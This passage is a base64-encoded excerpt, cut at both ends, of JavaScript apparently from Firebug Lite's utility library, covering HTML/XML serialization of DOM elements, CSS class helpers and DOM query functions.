GN1clNoZWV0LmhyZWYgPT0gaHJlZikNCiAgICAgICAgICAgIHJldCsrOw0KICAgIH0NCiAgICByZXR1cm4gcmV0Ow0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBIVE1MIGFuZCBYTUwgU2VyaWFsaXphdGlvbg0KDQoNCnZhciBnZXRFbGVtZW50VHlwZSA9IHRoaXMuZ2V0RWxlbWVudFR5cGUgPSBmdW5jdGlvbihub2RlKQ0Kew0KICAgIGlmIChpc0VsZW1lbnRYVUwobm9kZSkpDQogICAgICAgIHJldHVybiAneHVsJzsNCiAgICBlbHNlIGlmIChpc0VsZW1lbnRTVkcobm9kZSkpDQogICAgICAgIHJldHVybiAnc3ZnJzsNCiAgICBlbHNlIGlmIChpc0VsZW1lbnRNYXRoTUwobm9kZSkpDQogICAgICAgIHJldHVybiAnbWF0aG1sJzsNCiAgICBlbHNlIGlmIChpc0VsZW1lbnRYSFRNTChub2RlKSkNCiAgICAgICAgcmV0dXJuICd4aHRtbCc7DQogICAgZWxzZSBpZiAoaXNFbGVtZW50SFRNTChub2RlKSkNCiAgICAgICAgcmV0dXJuICdodG1sJzsNCn07DQoNCnZhciBnZXRFbGVtZW50U2ltcGxlVHlwZSA9IHRoaXMuZ2V0RWxlbWVudFNpbXBsZVR5cGUgPSBmdW5jdGlvbihub2RlKQ0Kew0KICAgIGlmIChpc0VsZW1lbnRTVkcobm9kZSkpDQogICAgICAgIHJldHVybiAnc3ZnJzsNCiAgICBlbHNlIGlmIChpc0VsZW1lbnRNYXRoTUwobm9kZSkpDQogICAgICAgIHJldHVybiAnbWF0aG1sJzsNCiAgICBlbHNlDQogICAgICAgIHJldHVybiAnaHRtbCc7DQp9Ow0KDQp2YXIgaXNFbGVtZW50SFRNTCA9IHRoaXMuaXNFbGVtZW50SFRNTCA9IGZ1bmN0aW9uKG5vZGUpDQp7DQogICAgcmV0dXJuIG5vZGUubm9kZU5hbWUgPT0gbm9kZS5ub2RlTmFtZS50b1VwcGVyQ2FzZSgpOw0KfTsNCg0KdmFyIGlzRWxlbWVudFhIVE1MID0gdGhpcy5pc0VsZW1lbnRYSFRNTCA9IGZ1bmN0aW9uKG5vZGUpDQp7DQogICAgcmV0dXJuIG5vZGUubm9kZU5hbWUgPT0gbm9kZS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpOw0KfTsNCg0KdmFyIGlzRWxlbWVudE1hdGhNTCA9IHRoaXMuaXNFbGVtZW50TWF0aE1MID0gZnVuY3Rpb24obm9kZSkNCnsNCiAgICByZXR1cm4gbm9kZS5uYW1lc3BhY2VVUkkgPT0gJ2h0dHA6Ly93d3cudzMub3JnLzE5OTgvTWF0aC9NYXRoTUwnOw0KfTsNCg0KdmFyIGlzRWxlbWVudFNWRyA9IHRoaXMuaXNFbGVtZW50U1ZHID0gZnVuY3Rpb24obm9kZSkNCnsNCiAgICByZXR1cm4gbm9kZS5uYW1lc3BhY2VVUkkgPT0gJ2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJzsNCn07DQoNCnZhciBpc0VsZW1lbnRYVUwgPSB0aGlzLmlzRWxlbWVudFhVTCA9IGZ1bmN0aW9uKG5vZGUpDQp7DQogICAgcmV0dXJuIG5vZGUgaW5zdGFuY2VvZiBYVUxFbGVtZW50Ow0KfTsNCg0KdGhpcy5pc1NlbGZDbG9zaW5nID0gZnVuY3Rpb24oZWxlbWVudCkNCnsNCiAgICBpZiAoaXNFbGVtZW50U1ZHKGVsZW1lbnQpIHx8IGlzRWxlbWVudE1hdGhNTChlbGVtZW50KSkNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgdmFyIHRhZyA9IGVsZW1lbnQubG9jYWxOYW1lLnRvTG93ZXJDYXNlKCk7DQogICAgcmV0dXJuICh0aGlzLnNlbGZDbG9zaW5nVGFncy5oYXNPd25Qcm9wZXJ0eSh0YWcpKTsNCn07DQoNCnRoaXMuZ2V0RWxlbWVudEhUTUwgPSBmdW5jdGlvbihlbGVtZW50KQ0Kew0KICAgIHZhciBzZWxmPXRoaXM7DQogICAgZnVuY3Rpb24gdG9IVE1MKGVsdCkNCiAgICB7DQogICAgICAgIGlmIChlbHQubm9kZVR5cGUgPT0gTm9kZS5FTEVNRU5UX05PREUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh1bndyYXBPYmplY3QoZWx0KS5maXJlYnVnSWdub3JlKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICAgICAgaHRtbC5wdXNoKCc8JywgZWx0Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkpOw0KDQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGVsdC5hdHRyaWJ1dGVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBhdHRyID0gZWx0LmF0dHJpYnV0ZXNbaV07DQoNCiAgICAgICAgICAgICAgICAvLyBIaWRlIGF0dHJpYnV0ZXMgc2V0IGJ5IEZpcmVidWcNCiAgICAgICAgICAgICAgICBpZiAoYXR0ci5sb2NhbE5hbWUuaW5kZXhPZigiZmlyZWJ1Zy0iKSA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCg0KICAgICAgICAgICAgICAgIC8vIE1hdGhNTA0KICAgICAgICAgICAgICAgIGlmIChhdHRyLmxvY2FsTmFtZS5pbmRleE9mKCItbW96LW1hdGgiKSA9PSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8ganVzdCBoaWRlIGZvciBub3cNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaHRtbC5wdXNoKCcgJywgYXR0ci5ub2RlTmFtZSwgJz0iJywgZXNjYXBlRm9yRWxlbWVudEF0dHJpYnV0ZShhdHRyLm5vZGVWYWx1ZSksJyInKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKGVsdC5maXJzdENoaWxkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnPicpOw0KDQogICAgICAgICAgICAgICAgdmFyIHB1cmVUZXh0PXRydWU7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgY2hpbGQgPSBlbGVtZW50LmZpcnN0Q2hpbGQ7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLm5leHRTaWJsaW5nKQ0KICAgICAgICAgICAgICAgICAgICBwdXJlVGV4dD1wdXJlVGV4dCAmJiAoY2hpbGQubm9kZVR5cGUgPT0gTm9kZS5URVhUX05PREUpOw0KDQogICAgICAgICAgICAgICAgaWYgKHB1cmVUZXh0KQ0KICAgICAgICAgICAgICAgICAgICBodG1sLnB1c2goZXNjYXBlRm9ySHRtbEVkaXRvcihlbHQudGV4dENvbnRlbnQpKTsNCiAgICAgICAgICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgY2hpbGQgPSBlbHQuZmlyc3RDaGlsZDsgY2hpbGQ7IGNoaWxkID0gY2hpbGQubmV4dFNpYmxpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB0b0hUTUwoY2hpbGQpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnPC8nLCBlbHQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSwgJz4nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKGlzRWxlbWVudFNWRyhlbHQpIHx8IGlzRWxlbWVudE1hdGhNTChlbHQpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnLz4nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKHNlbGYuaXNTZWxmQ2xvc2luZyhlbHQpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgoaXNFbGVtZW50WEhUTUwoZWx0KSk/Jy8+JzonPicpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnPjwvJywgZWx0Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCksICc+Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoZWx0Lm5vZGVUeXBlID09IE5vZGUuVEVYVF9OT0RFKQ0KICAgICAgICAgICAgaHRtbC5wdXNoKGVzY2FwZUZvclRleHROb2RlKGVsdC50ZXh0Q29udGVudCkpOw0KICAgICAgICBlbHNlIGlmIChlbHQubm9kZVR5cGUgPT0gTm9kZS5DREFUQV9TRUNUSU9OX05PREUpDQogICAgICAgICAgICBodG1sLnB1c2goJzwhW0NEQVRBWycsIGVsdC5ub2RlVmFsdWUsICddXT4nKTsNCiAgICAgICAgZWxzZSBpZiAoZWx0Lm5vZGVUeXBlID09IE5vZGUuQ09NTUVOVF9OT0RFKQ0KICAgICAgICAgICAgaHRtbC5wdXNoKCc8IS0tJywgZWx0Lm5vZGVWYWx1ZSwgJy0tPicpOw0KICAgIH0NCg0KICAgIHZhciBodG1sID0gW107DQogICAgdG9IVE1MKGVsZW1lbnQpOw0KICAgIHJldHVybiBodG1sLmpvaW4oIiIpOw0KfTsNCg0KdGhpcy5nZXRFbGVtZW50WE1MID0gZnVuY3Rpb24oZWxlbWVudCkNCnsNCiAgICBmdW5jdGlvbiB0b1hNTChlbHQpDQogICAgew0KICAgICAgICBpZiAoZWx0Lm5vZGVUeXBlID09IE5vZGUuRUxFTUVOVF9OT0RFKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAodW53cmFwT2JqZWN0KGVsdCkuZmlyZWJ1Z0lnbm9yZSkNCiAgICAgICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgICAgIHhtbC5wdXNoKCc8JywgZWx0Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkpOw0KDQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGVsdC5hdHRyaWJ1dGVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBhdHRyID0gZWx0LmF0dHJpYnV0ZXNbaV07DQoNCiAgICAgICAgICAgICAgICAvLyBIaWRlIGF0dHJpYnV0ZXMgc2V0IGJ5IEZpcmVidWcNCiAgICAgICAgICAgICAgICBpZiAoYXR0ci5sb2NhbE5hbWUuaW5kZXhPZigiZmlyZWJ1Zy0iKSA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCg0KICAgICAgICAgICAgICAgIC8vIE1hdGhNTA0KICAgICAgICAgICAgICAgIGlmIChhdHRyLmxvY2FsTmFtZS5pbmRleE9mKCItbW96LW1hdGgiKSA9PSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8ganVzdCBoaWRlIGZvciBub3cNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgeG1sLnB1c2goJyAnLCBhdHRyLm5vZGVOYW1lLCAnPSInLCBlc2NhcGVGb3JFbGVtZW50QXR0cmlidXRlKGF0dHIubm9kZVZhbHVlKSwnIicpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoZWx0LmZpcnN0Q2hpbGQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgeG1sLnB1c2goJz4nKTsNCg0KICAgICAgICAgICAgICAgIGZvciAodmFyIGNoaWxkID0gZWx0LmZpcnN0Q2hpbGQ7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLm5leHRTaWJsaW5nKQ0KICAgICAgICAgICAgICAgICAgICB0b1hNTChjaGlsZCk7DQoNCiAgICAgICAgICAgICAgICB4bWwucHVzaCgnPC8nLCBlbHQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSwgJz4nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB4bWwucHVzaCgnLz4nKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChlbHQubm9kZVR5cGUgPT0gTm9kZS5URVhUX05PREUpDQogICAgICAgICAgICB4bWwucHVzaChlbHQubm9kZVZhbHVlKTsNCiAgICAgICAgZWxzZSBpZiAoZWx0Lm5vZGVUeXBlID09IE5vZGUuQ0RBVEFfU0VDVElPTl9OT0RFKQ0KICAgICAgICAgICAgeG1sLnB1c2goJzwhW0NEQVRBWycsIGVsdC5ub2RlVmFsdWUsICddXT4nKTsNCiAgICAgICAgZWxzZSBpZiAoZWx0Lm5vZGVUeXBlID09IE5vZGUuQ09NTUVOVF9OT0RFKQ0KICAgICAgICAgICAgeG1sLnB1c2goJzwhLS0nLCBlbHQubm9kZVZhbHVlLCAnLS0+Jyk7DQogICAgfQ0KDQogICAgdmFyIHhtbCA9IFtdOw0KICAgIHRvWE1MKGVsZW1lbnQpOw0KICAgIHJldHVybiB4bWwuam9pbigiIik7DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ1NTIGNsYXNzZXMNCg0KdGhpcy5oYXNDbGFzcyA9IGZ1bmN0aW9uKG5vZGUsIG5hbWUpIC8vIGNsYXNzTmFtZSwgY2xhc3NOYW1lLCAuLi4NCnsNCiAgICAvLyBUT0RPOiB4eHhwZWRybyB3aGVuIGxpYi5oYXNDbGFzcyBpcyBjYWxsZWQgd2l0aCBtb3JlIHRoYW4gMiBhcmd1bWVudHM/DQogICAgLy8gdGhpcyBmdW5jdGlvbiBjYW4gYmUgb3B0aW1pemVkIGEgbG90IGlmIGFzc3VtZWQgMiBhcmd1bWVudHMgb25seSwNCiAgICAvLyB3aGljaCBzZWVtcyB0byBiZSB3aGF0IGhhcHBlbnMgOTklIG9mIHRoZSB0aW1lDQogICAgaWYgKGFyZ3VtZW50cy5sZW5ndGggPT0gMikNCiAgICAgICAgcmV0dXJuICgnICcrbm9kZS5jbGFzc05hbWUrJyAnKS5pbmRleE9mKCcgJytuYW1lKycgJykgIT0gLTE7DQogICAgDQogICAgaWYgKCFub2RlIHx8IG5vZGUubm9kZVR5cGUgIT0gMSkNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIGZvciAodmFyIGk9MTsgaTxhcmd1bWVudHMubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBuYW1lID0gYXJndW1lbnRzW2ldOw0KICAgICAgICAgICAgdmFyIHJlID0gbmV3IFJlZ0V4cCgiKF58XFxzKSIrbmFtZSsiKCR8XFxzKSIpOw0KICAgICAgICAgICAgaWYgKCFyZS5leGVjKG5vZGUuY2xhc3NOYW1lKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQp9Ow0KDQp0aGlzLm9sZF9oYXNDbGFzcyA9IGZ1bmN0aW9uKG5vZGUsIG5hbWUpIC8vIGNsYXNzTmFtZSwgY2xhc3NOYW1lLCAuLi4NCnsNCiAgICBpZiAoIW5vZGUgfHwgbm9kZS5ub2RlVHlwZSAhPSAxKQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaT0xOyBpPGFyZ3VtZW50cy5sZW5ndGg7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG5hbWUgPSBhcmd1bWVudHNbaV07DQogICAgICAgICAgICB2YXIgcmUgPSBuZXcgUmVnRXhwKCIoXnxcXHMpIituYW1lKyIoJHxcXHMpIik7DQogICAgICAgICAgICBpZiAoIXJlLmV4ZWMobm9kZS5jbGFzc05hbWUpKQ0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCn07DQoNCnRoaXMuc2V0Q2xhc3MgPSBmdW5jdGlvbihub2RlLCBuYW1lKQ0Kew0KICAgIGlmIChub2RlICYmICgnICcrbm9kZS5jbGFzc05hbWUrJyAnKS5pbmRleE9mKCcgJytuYW1lKycgJykgPT0gLTEpDQogICAgLy8vaWYgKG5vZGUgJiYgIXRoaXMuaGFzQ2xhc3Mobm9kZSwgbmFtZSkpDQogICAgICAgIG5vZGUuY2xhc3NOYW1lICs9ICIgIiArIG5hbWU7DQp9Ow0KDQp0aGlzLmdldENsYXNzVmFsdWUgPSBmdW5jdGlvbihub2RlLCBuYW1lKQ0Kew0KICAgIHZhciByZSA9IG5ldyBSZWdFeHAobmFtZSsiLShbXiBdKykiKTsNCiAgICB2YXIgbSA9IHJlLmV4ZWMobm9kZS5jbGFzc05hbWUpOw0KICAgIHJldHVybiBtID8gbVsxXSA6ICIiOw0KfTsNCg0KdGhpcy5yZW1vdmVDbGFzcyA9IGZ1bmN0aW9uKG5vZGUsIG5hbWUpDQp7DQogICAgaWYgKG5vZGUgJiYgbm9kZS5jbGFzc05hbWUpDQogICAgew0KICAgICAgICB2YXIgaW5kZXggPSBub2RlLmNsYXNzTmFtZS5pbmRleE9mKG5hbWUpOw0KICAgICAgICBpZiAoaW5kZXggPj0gMCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHNpemUgPSBuYW1lLmxlbmd0aDsNCiAgICAgICAgICAgIG5vZGUuY2xhc3NOYW1lID0gbm9kZS5jbGFzc05hbWUuc3Vic3RyKDAsaW5kZXgtMSkgKyBub2RlLmNsYXNzTmFtZS5zdWJzdHIoaW5kZXgrc2l6ZSk7DQogICAgICAgIH0NCiAgICB9DQp9Ow0KDQp0aGlzLnRvZ2dsZUNsYXNzID0gZnVuY3Rpb24oZWx0LCBuYW1lKQ0Kew0KICAgIGlmICgoJyAnK2VsdC5jbGFzc05hbWUrJyAnKS5pbmRleE9mKCcgJytuYW1lKycgJykgIT0gLTEpDQogICAgLy8vaWYgKHRoaXMuaGFzQ2xhc3MoZWx0LCBuYW1lKSkNCiAgICAgICAgdGhpcy5yZW1vdmVDbGFzcyhlbHQsIG5hbWUpOw0KICAgIGVsc2UNCiAgICAgICAgdGhpcy5zZXRDbGFzcyhlbHQsIG5hbWUpOw0KfTsNCg0KdGhpcy5zZXRDbGFzc1RpbWVkID0gZnVuY3Rpb24oZWx0LCBuYW1lLCBjb250ZXh0LCB0aW1lb3V0KQ0Kew0KICAgIGlmICghdGltZW91dCkNCiAgICAgICAgdGltZW91dCA9IDEzMDA7DQoNCiAgICBpZiAoZWx0Ll9fc2V0Q2xhc3NUaW1lb3V0KQ0KICAgICAgICBjb250ZXh0LmNsZWFyVGltZW91dChlbHQuX19zZXRDbGFzc1RpbWVvdXQpOw0KICAgIGVsc2UNCiAgICAgICAgdGhpcy5zZXRDbGFzcyhlbHQsIG5hbWUpOw0KDQogICAgZWx0Ll9fc2V0Q2xhc3NUaW1lb3V0ID0gY29udGV4dC5zZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGRlbGV0ZSBlbHQuX19zZXRDbGFzc1RpbWVvdXQ7DQoNCiAgICAgICAgRkJMLnJlbW92ZUNsYXNzKGVsdCwgbmFtZSk7DQogICAgfSwgdGltZW91dCk7DQp9Ow0KDQp0aGlzLmNhbmNlbENsYXNzVGltZWQgPSBmdW5jdGlvbihlbHQsIG5hbWUsIGNvbnRleHQpDQp7DQogICAgaWYgKGVsdC5fX3NldENsYXNzVGltZW91dCkNCiAgICB7DQogICAgICAgIEZCTC5yZW1vdmVDbGFzcyhlbHQsIG5hbWUpOw0KICAgICAgICBjb250ZXh0LmNsZWFyVGltZW91dChlbHQuX19zZXRDbGFzc1RpbWVvdXQpOw0KICAgICAgICBkZWxldGUgZWx0Ll9fc2V0Q2xhc3NUaW1lb3V0Ow0KICAgIH0NCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBET00gcXVlcmllcw0KDQp0aGlzLiQgPSBmdW5jdGlvbihpZCwgZG9jKQ0Kew0KICAgIGlmIChkb2MpDQogICAgICAgIHJldHVybiBkb2MuZ2V0RWxlbWVudEJ5SWQoaWQpOw0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIHJldHVybiBGQkwuRmlyZWJ1Zy5jaHJvbWUuZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpOw0KICAgIH0NCn07DQoNCnRoaXMuJCQgPSBmdW5jdGlvbihzZWxlY3RvciwgZG9jKQ0Kew0KICAgIGlmIChkb2MgfHwgIUZCTC5GaXJlYnVnLmNocm9tZSkNCiAgICAgICAgcmV0dXJuIEZCTC5GaXJlYnVnLlNlbGVjdG9yKHNlbGVjdG9yLCBkb2MpOw0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIHJldHVybiBGQkwuRmlyZWJ1Zy5TZWxlY3RvcihzZWxlY3RvciwgRkJMLkZpcmVidWcuY2hyb21lLmRvY3VtZW50KTsNCiAgICB9DQp9Ow0KDQp0aGlzLmdldENoaWxkQnlDbGFzcyA9IGZ1bmN0aW9uKG5vZGUpIC8vICxjbGFzc25hbWUsIGNsYXNzbmFtZSwgY2xhc3NuYW1lLi4uDQp7DQogICAgZm9yICh2YXIgaSA9IDE7IGkgPCBhcmd1bWVudHMubGVuZ3RoOyArK2kpDQogICAgew0KICAgICAgICB2YXIgY2xhc3NOYW1lID0gYXJndW1lbnRzW2ldOw0KICAgICAgICB2YXIgY2hpbGQgPSBub2RlLmZpcnN0Q2hpbGQ7DQogICAgICAgIG5vZGUgPSBudWxsOw0KICAgICAgICBmb3IgKDsgY2hpbGQ7IGNoaWxkID0gY2hpbGQubmV4dFNpYmxpbmcpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh0aGlzLmhhc0NsYXNzKGNoaWxkLCBjbGFzc05hbWUpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG5vZGUgPSBjaGlsZDsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiBub2RlOw0KfTsNCg0KdGhpcy5nZXRBbmNlc3RvckJ5Q2xhc3MgPSBmdW5jdGlvbihub2RlLCBjbGFzc05hbWUpDQp7DQogICAgZm9yICh2YXIgcGFyZW50ID0gbm9kZTsgcGFyZW50OyBwYXJlbnQgPSBwYXJlbnQucGFyZW50Tm9kZSkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmhhc0NsYXNzKHBhcmVudCwgY2xhc3NOYW1lKSkNCiAgICAgICAgICAgIHJldHVybiBwYXJlbnQ7DQogICAgfQ0KDQogICAgcmV0dXJuIG51bGw7DQp9Ow0KDQoNCnRoaXMuZ2V0RWxlbWVudHNCeUNsYXNzID0gZnVuY3Rpb24obm9kZSwgY2xhc3NOYW1lKQ0Kew0KICAgIHZhciByZXN1bHQgPSBbXTsNCiAgICANCiAgICBmb3IgKHZhciBjaGlsZCA9IG5vZGUuZmlyc3RDaGlsZDsgY2hpbGQ7IGNoaWxkID0gY2hpbGQubmV4dFNpYmxpbmcpDQogICAgew0KICAgICAgICBpZiAodGhpcy5oYXNDbGFzcyhjaGlsZCwgY2xhc3NOYW1lKSkNCiAgICAgICAgICAgIHJlc3VsdC5wdXNoKGNoaWxkKTsNCiAgICB9DQoNCiAgICByZXR1cm4gcmVzdWx0Ow0KfTsNCg0KdGhpcy5nZXRFbGVtZW50QnlDbGFzcyA9IGZ1bmN0aW9uKG5vZGUsIGNsYXNzTmFtZSkgIC8vIGNsYXNzTmFtZSwgY2xhc3NOYW1lLCAuLi4NCnsNCiAgICB2YXIgYXJncyA9IGNsb25lQXJyYXkoYXJndW1lbnRzKTsgYXJncy5zcGxpY2UoMCwgMSk7DQogICAgZm9yICh2YXIgY2hpbGQgPSBub2RlLmZpcnN0Q2hpbGQ7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLm5leHRTaWJsaW5nKQ0KICAgIHsNCiAgICAgICAgdmFyIGFyZ3MxID0gY2xvbmVBcnJheShhcmdzKTsgYXJnczEudW5zaGlmdChjaGlsZCk7DQogICAgICAgIGlmIChGQkwuaGFzQ2xhc3MuYXBwbHkobnVsbCwgYXJnczEpKQ0KICAgICAgICAgICAgcmV0dXJuIGNoaWxkOw0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBmb3VuZCA9IEZCTC5nZXRFbGVtZW50QnlDbGFzcy5hcHBseShudWxsLCBhcmdzMSk7DQogICAgICAgICAgICBpZiAoZm91bmQpDQogICAgICAgICAgICAgICAgcmV0dXJuIGZvdW5kOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuIG51bGw7DQp9Ow0KDQp0aGlzLmlzQW5jZXN0b3IgPSBmdW5jdGlvbihub2RlLCBwb3RlbnRpYWxBbmNlc3RvcikNCnsNCiAgICBmb3IgKHZhciBwYXJlbnQgPSBub2RlOyBwYXJlbnQ7IHBhcmVudCA9IHBhcmVudC5wYXJlbnROb2RlKQ0KICAgIHsNCiAgICAgICAgaWYgKHBhcmVudCA9PSBwb3RlbnRpYWxBbmNlc3RvcikNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCg0KICAgIHJldHVybiBmYWxzZTsNCn07DQoNCnRoaXMuZ2V0TmV4dEVsZW1lbnQgPSBmdW5jdGlvbihub2RlKQ0Kew0KICAgIHdoaWxlIChub2RlICYmIG5vZGUubm9kZVR5cGUgIT0gMSkNCiAgICAgICAgbm9kZSA9IG5vZGUubmV4dFNpYmxpbmc7DQoNCiAgICByZXR1cm4gbm9kZTsNCn07DQoNCnRoaXMuZ2V0UHJldmlvdXNFbGVtZW50ID0gZnVuY3Rpb24obm9kZSkNCnsNCiAgICB3aGlsZSAobm9kZSAmJiBub2RlLm5vZGVUeXBlICE9IDEpDQogICAgICAgIG5vZGUgPSBub2RlLnByZXZpb3VzU2libGluZzsNCg0KICAgIHJldHVybiBub2RlOw0KfTsNCg0KdGhpcy5nZXRCb2R5ID0gZnVuY3Rpb24oZG9jKQ0Kew0KICAgIGlmIChkb2MuYm9keSkNCiAgICAgICAgcmV0dXJuIGRvYy5ib2R5Ow0KDQogICAgdmFyIGJvZHkgPSBkb2MuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImJvZHkiKVswXTsNCiAgICBpZiAoYm9keSkNCiAgICAgICAgcmV0dXJuIGJvZHk7DQoNCiAgICByZXR1cm4gZG9jLmZpcnN0Q2hpbGQ7ICAvLyBGb3Igbm9uLUhUTUwgZG9jcw0KfTsNCg0KdGhpcy5maW5kTmV4dERvd24gPSBmdW5jdGlvbihub2RlLCBjcml0ZXJpYSkNCnsNCiAgICBpZiAoIW5vZGUpDQogICAgICAgIHJldHVybiBudWxsOw0KDQogICAgZm9yICh2YXIgY2hpbGQgPSBub2RlLmZpcnN0Q2hpbGQ7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLm5leHRTaWJsaW5nKQ0KICAgIHsNCiAgICAgICAgaWYgKGNyaXRlcmlhKGNoaWxkKSkNCiAgICAgICAgICAgIHJldHVybiBjaGlsZDsNCg0KICAgICAgICB2YXIgbmV4dCA9IHRoaXMuZmluZE5leHREb3duKGNoaWxkLCBjcml0ZXJpYSk7DQogICAgICAgIGlmIChuZXh0KQ0KICAgICAgICAgICAgcmV0dXJuIG5leHQ7DQogICAgfQ0KfTsNCg0KdGhpcy5maW5kUHJldmlvdXNVcCA9IGZ1bmN0aW9uKG5vZGUsIGNyaXRlcmlhKQ0Kew0KICAgIGlmICghbm9kZSkNCiAgICAgICAgcmV0dXJuIG51bGw7DQoNCiAgICBmb3IgKHZhciBjaGlsZCA9IG5vZGUubGFzdENoaWxkOyBjaGlsZDsgY2hpbGQgPSBjaGlsZC5wcmV2aW91c1NpYmxpbmcpDQogICAgew0KICAgICAgICB2YXIgbmV4dCA9IHRoaXMuZmluZFByZXZpb3VzVXAoY2hpbGQsIGNyaXRlcmlhKTsNCiAgICAgICAgaWYgKG5leHQpDQogICAgICAgICAgICByZXR1cm4gbmV4dDsNCg0KICAgICAgICBpZiAoY3JpdGVyaWEoY2hpbGQpKQ0KICAgICAgICAgICAgcmV0dXJuIGNoaWxkOw0KICAgIH0NCn07DQoNCnRoaXMuZmluZE5leHQgPSBmdW5jdGlvbihub2RlLCBjcml0ZXJpYSwgdXBPbmx5LCBtYXhSb290KQ0Kew0KICAgIGlmICghbm9kZSkNCiAgICAgICAgcmV0dXJuIG51bGw7DQoNCiAgICBpZiAoIXVwT25seSkNCiAgICB7DQogICAgICAgIHZhciBuZXh0ID0gdGhpcy5maW5kTmV4dERvd24obm9kZSwgY3JpdGVyaWEpOw0KICAgICAgICBpZiAobmV4dCkNCiAgICAgICAgICAgIHJldHVybiBuZXh0Ow0KICAgIH0NCg0KICAgIGZvciAodmFyIHNpYiA9IG5vZGUubmV4dFNpYmxpbmc7IHNpYjsgc2liID0gc2liLm5leH